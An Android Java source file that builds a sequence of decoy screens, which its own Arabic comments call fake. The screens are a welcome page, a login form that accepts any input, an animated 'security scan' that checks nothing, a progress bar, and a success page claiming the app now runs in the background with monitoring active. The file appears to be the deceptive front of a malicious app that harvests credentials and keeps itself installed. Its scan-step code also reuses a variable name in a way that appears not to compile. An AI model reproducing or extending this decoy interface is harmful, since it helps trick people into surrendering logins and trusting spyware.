// FakeUIManager.java
package com.sec.check;

import android.app.Activity;
import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;

/**
 * FakeUIManager — يدير الشاشات الوهمية
 * ============================================================
 * شاشات التطبيق الحقيقية:
 * 1. Welcome
 * 2. Login
 * 3. Security Scan
 * 4. Progress
 * 5. Success
 */
public class FakeUIManager {

    private static final String TAG = "SecurityCheck";

    private Activity activity;
    private Handler handler;
    private LinearLayout rootView;

    // Callbacks
    public interface UIReadyCallback {
        void onReady();
    }

    // ============================================================
    // Constructor
    // ============================================================
    public FakeUIManager(Activity activity) {
        this.activity = activity;
        this.handler = new Handler(Looper.getMainLooper());
    }

    // ============================================================
    // Helpers
    // ============================================================
    private int dp(int dp) {
        float density = activity.getResources().getDisplayMetrics().density;
        return (int) (dp * density + 0.5f);
    }

    private LinearLayout createBaseLayout() {
        LinearLayout root = new LinearLayout(activity);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0b1120"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(dp(30), dp(30), dp(30), dp(30));
        return root;
    }

    private TextView createTitle(String text) {
        TextView tv = new TextView(activity);
        tv.setText(text);
        tv.setTextSize(24);
        tv.setTextColor(Color.WHITE);
        tv.setTypeface(null, Typeface.BOLD);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(0, dp(20), 0, dp(10));
        return tv;
    }

    private TextView createSubtitle(String text) {
        TextView tv = new TextView(activity);
        tv.setText(text);
        tv.setTextSize(14);
        tv.setTextColor(Color.parseColor("#94a3b8"));
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(0, dp(5), 0, dp(20));
        return tv;
    }

    private TextView createIcon(String emoji, int size) {
        TextView tv = new TextView(activity);
        tv.setText(emoji);
        tv.setTextSize(size);
        tv.setGravity(Gravity.CENTER);
        return tv;
    }

    // ============================================================
    // 1. Welcome Screen
    // ============================================================
    public void showWelcomeScreen(Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        // Icon
        TextView icon = createIcon("🔒", 80);
        root.addView(icon);

        // Title
        TextView title = createTitle("التحقق الأمني");
        root.addView(title);

        // Subtitle
        TextView subtitle = createSubtitle(
            "نظام حماية متقدم\nلحماية بياناتك وخصوصيتك"
        );
        root.addView(subtitle);

        // Spacer
        LinearLayout spacer = new LinearLayout(activity);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(40)
        ));
        root.addView(spacer);

        // Progress
        ProgressBar progress = new ProgressBar(activity);
        progress.setIndeterminate(true);
        root.addView(progress);

        TextView loading = new TextView(activity);
        loading.setText("جاري التحميل...");
        loading.setTextColor(Color.parseColor("#64748b"));
        loading.setTextSize(12);
        loading.setPadding(0, dp(10), 0, 0);
        root.addView(loading);

        // Fade in
        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
        fadeIn.setDuration(800);
        root.startAnimation(fadeIn);

        activity.setContentView(root);

        // After 2 seconds → next screen
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, 2000);
    }

    // ============================================================
    // 2. Login Screen
    // ============================================================
    public void showLoginScreen(Runnable onLogin) {
        ScrollView scroll = new ScrollView(activity);
        scroll.setBackgroundColor(Color.parseColor("#0b1120"));

        LinearLayout root = new LinearLayout(activity);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dp(30), dp(60), dp(30), dp(30));
        root.setGravity(Gravity.CENTER_HORIZONTAL);

        // Icon
        TextView icon = createIcon("🛡️", 60);
        root.addView(icon);

        // Title
        TextView title = createTitle("تسجيل الدخول");
        root.addView(title);

        // Subtitle
        TextView subtitle = createSubtitle("يرجى تسجيل الدخول للمتابعة");
        root.addView(subtitle);

        // Username field
        TextView userLabel = new TextView(activity);
        userLabel.setText("اسم المستخدم");
        userLabel.setTextColor(Color.parseColor("#cbd5e1"));
        userLabel.setTextSize(13);
        userLabel.setPadding(dp(5), dp(10), dp(5), dp(5));
        root.addView(userLabel);

        EditText username = new EditText(activity);
        username.setHint("أدخل اسم المستخدم");
        username.setTextColor(Color.WHITE);
        username.setHintTextColor(Color.parseColor("#64748b"));
        username.setBackgroundColor(Color.parseColor("#1e293b"));
        username.setPadding(dp(15), dp(12), dp(15), dp(12));
        username.setTextSize(14);
        root.addView(username);

        // Password field
        TextView passLabel = new TextView(activity);
        passLabel.setText("كلمة السر");
        passLabel.setTextColor(Color.parseColor("#cbd5e1"));
        passLabel.setTextSize(13);
        passLabel.setPadding(dp(5), dp(15), dp(5), dp(5));
        root.addView(passLabel);

        EditText password = new EditText(activity);
        password.setHint("أدخل كلمة السر");
        password.setInputType(android.text.InputType.TYPE_CLASS_TEXT |
                              android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
        password.setTextColor(Color.WHITE);
        password.setHintTextColor(Color.parseColor("#64748b"));
        password.setBackgroundColor(Color.parseColor("#1e293b"));
        password.setPadding(dp(15), dp(12), dp(15), dp(12));
        password.setTextSize(14);
        root.addView(password);

        // Login button
        Button loginBtn = new Button(activity);
        loginBtn.setText("دخول");
        loginBtn.setTextColor(Color.WHITE);
        loginBtn.setTextSize(16);
        loginBtn.setTypeface(null, Typeface.BOLD);
        loginBtn.setBackgroundColor(Color.parseColor("#2563eb"));
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
        );
        btnParams.topMargin = dp(25);
        loginBtn.setLayoutParams(btnParams);

        loginBtn.setOnClickListener(v -> {
            String u = username.getText().toString().trim();
            String p = password.getText().toString().trim();

            // ما تقبلش الفاضي
            if (u.isEmpty() || p.isEmpty()) {
                loginBtn.setText("يرجى ملء البيانات");
                loginBtn.setBackgroundColor(Color.parseColor("#dc2626"));
                handler.postDelayed(() -> {
                    loginBtn.setText("دخول");
                    loginBtn.setBackgroundColor(Color.parseColor("#2563eb"));
                }, 1500);
                return;
            }

            // اقبل أي حاجة (وهمي)
            loginBtn.setText("جاري التحقق...");
            loginBtn.setEnabled(false);

            handler.postDelayed(() -> {
                if (onLogin != null) onLogin.run();
            }, 1500);
        });

        root.addView(loginBtn);

        // Footer
        TextView footer = new TextView(activity);
        footer.setText("🛡️ اتصال مشفّر · SSL 256-bit");
        footer.setTextColor(Color.parseColor("#475569"));
        footer.setTextSize(11);
        footer.setPadding(0, dp(30), 0, 0);
        footer.setGravity(Gravity.CENTER);
        root.addView(footer);

        scroll.addView(root);
        activity.setContentView(scroll);
    }

    // ============================================================
    // 3. Security Scan Screen (with animations)
    // ============================================================
    public void showSecurityScanScreen(Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        // Icon
        TextView icon = createIcon("🛡️", 60);
        root.addView(icon);

        // Title
        TextView title = createTitle("جاري الفحص الأمني");
        root.addView(title);

        // Subtitle
        TextView subtitle = createSubtitle("يتم فحص جهازك وبياناتك");
        root.addView(subtitle);

        // Steps container
        LinearLayout stepsContainer = new LinearLayout(activity);
        stepsContainer.setOrientation(LinearLayout.VERTICAL);
        stepsContainer.setBackgroundColor(Color.parseColor("#1e293b"));
        stepsContainer.setPadding(dp(20), dp(20), dp(20), dp(20));
        LinearLayout.LayoutParams stepsParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        stepsParams.topMargin = dp(20);
        stepsContainer.setLayoutParams(stepsParams);
        root.addView(stepsContainer);

        String[] steps = {
            "🔍 فحص الاتصال بالشبكة",
            "🔐 التحقق من هوية الجهاز",
            "🛡️ فحص الأمان العام",
            "📊 تحليل المخاطر المحتملة",
            "🔒 فحص التشفير",
            "✅ التأكد من سلامة النظام",
        };

        int[] delays = {500, 700, 800, 900, 800, 700};

        activity.setContentView(root);

        // ★ أضف كل خطوة تدريجياً
        for (int i = 0; i < steps.length; i++) {
            final int index = i;
            final String stepText = steps[i];
            final int delay = delays[i];

            handler.postDelayed(() -> {
                LinearLayout stepRow = new LinearLayout(activity);
                stepRow.setOrientation(LinearLayout.HORIZONTAL);
                stepRow.setPadding(0, dp(8), 0, dp(8));

                TextView stepIcon = new TextView(activity);
                stepIcon.setText("⏳");
                stepIcon.setTextSize(16);
                stepIcon.setPadding(0, 0, dp(10), 0);
                stepRow.addView(stepIcon);

                TextView stepText = new TextView(activity);
                stepText.setText(stepText);
                stepText.setTextColor(Color.parseColor("#cbd5e1"));
                stepText.setTextSize(14);
                stepRow.addView(stepText);

                stepsContainer.addView(stepRow);

                // بعد 500ms → غير الأيقونة لـ ✓
                handler.postDelayed(() -> {
                    stepIcon.setText("✅");
                }, 500);

            }, getAccumulatedDelay(delays, i));
        }

        // بعد ما كل الخطوات تخلص
        int totalDelay = getAccumulatedDelay(delays, steps.length) + 800;
        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, totalDelay);
    }

    private int getAccumulatedDelay(int[] delays, int upTo) {
        int sum = 0;
        for (int i = 0; i < upTo; i++) {
            sum += delays[i];
        }
        return sum;
    }

    // ============================================================
    // 4. Progress Screen
    // ============================================================
    public void showProgressScreen(String message, Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        TextView icon = createIcon("⚙️", 60);
        root.addView(icon);

        TextView title = createTitle(message != null ? message : "جاري التهيئة");
        root.addView(title);

        ProgressBar progress = new ProgressBar(
            activity, null, android.R.attr.progressBarStyleHorizontal
        );
        progress.setMax(100);
        progress.setProgress(0);
        LinearLayout.LayoutParams pParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(8)
        );
        pParams.topMargin = dp(30);
        progress.setLayoutParams(pParams);
        root.addView(progress);

        TextView percent = new TextView(activity);
        percent.setText("0%");
        percent.setTextColor(Color.WHITE);
        percent.setTextSize(18);
        percent.setTypeface(null, Typeface.BOLD);
        percent.setGravity(Gravity.CENTER);
        percent.setPadding(0, dp(15), 0, 0);
        root.addView(percent);

        activity.setContentView(root);

        // ★ Progress animation
        final int[] current = {0};
        final int[] steps = {5, 8, 12, 15, 20, 25, 35, 50, 65, 75, 85, 92, 98, 100};

        for (int i = 0; i < steps.length; i++) {
            final int target = steps[i];
            handler.postDelayed(() -> {
                progress.setProgress(target);
                percent.setText(target + "%");
            }, (i + 1) * 200);
        }

        handler.postDelayed(() -> {
            if (onComplete != null) onComplete.run();
        }, steps.length * 200 + 500);
    }

    // ============================================================
    // 5. Success Screen
    // ============================================================
    public void showSuccessScreen(Runnable onComplete) {
        LinearLayout root = createBaseLayout();

        TextView icon = createIcon("✅", 80);
        root.addView(icon);

        TextView title = createTitle("تم التفعيل بنجاح");
        title.setTextColor(Color.parseColor("#4ade80"));
        root.addView(title);

        TextView subtitle = createSubtitle(
            "التطبيق يعمل الآن في الخلفية\nلحماية جهازك"
        );
        root.addView(subtitle);

        // Info card
        LinearLayout card = new LinearLayout(activity);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundColor(Color.parseColor("#1e293b"));
        card.setPadding(dp(20), dp(20), dp(20), dp(20));
        LinearLayout.LayoutParams cParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        cParams.topMargin = dp(20);
        card.setLayoutParams(cParams);

        String[] info = {
            "🔒 الحماية: مفعّلة",
            "📡 المراقبة: نشطة",
            "🛡️ الجدار الأمني: يعمل",
            "✅ النظام: آمن",
        };

        for (String line : info) {
            TextView tv = new TextView(activity);
            tv.setText(line);
            tv.setTextColor(Color.parseColor("#cbd5e1"));
            tv.setTextSize(14);
            tv.setPadding(0, dp(6), 0, dp(6));
            card.addView(tv);
        }

        root.addView(card);

        // Close button
        Button closeBtn = new Button(activity);
        closeBtn.setText("إغلاق");
        closeBtn.setTextColor(Color.WHITE);
        closeBtn.setTextSize(16);
        closeBtn.setTypeface(null, Typeface.BOLD);
        closeBtn.setBackgroundColor(Color.parseColor("#16a34a"));
        LinearLayout.LayoutParams bParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
        );
        bParams.topMargin = dp(30);
        closeBtn.setLayoutParams(bParams);

        closeBtn.setOnClickListener(v -> {
            if (onComplete != null) onComplete.run();
        });

        root.addView(closeBtn);

        // Fade in
        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
        fadeIn.setDuration(600);
        root.startAnimation(fadeIn);

        activity.setContentView(root);
    }
}
